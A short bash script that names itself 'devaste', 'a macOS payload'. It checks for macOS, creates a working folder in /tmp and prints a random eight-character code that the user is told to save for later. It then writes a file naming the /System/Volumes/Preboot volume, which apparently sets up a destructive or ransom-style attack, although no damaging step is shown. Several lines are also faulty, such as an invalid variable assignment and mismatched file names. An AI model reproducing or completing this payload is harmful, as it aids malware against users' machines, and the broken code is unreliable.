#!/bin/bash

 sys="/System"
if [ ! -d "$sys" ]; then
    echo "  devaste is a macOS payload. Exit with error: unsupported system."
    exit 1
else
   echo
   echo "  Please wait."

fi

$loc=/usr/local/bin

if [ ! -e $loc ]; then
    mkdir /usr/local/bin
fi

mkdir /tmp/devaste
  dtmp="/tmp/devaste"
  
touch $dtmp/pdata.txt
cd $dtmp

array=()
for i in {a..z} {A..Z} {0..9}; 
do
  array[$RANDOM]=$i
  done
  printf %s ${array[@]::8} $'\n'

  echo "  --> Save the combination given above. You will need it later."
  sleep 10

  cat > pdat.txt <<EOF
  /System/Volumes/Preboot
  The quick brown fox jumps over the lazy dog
EOF
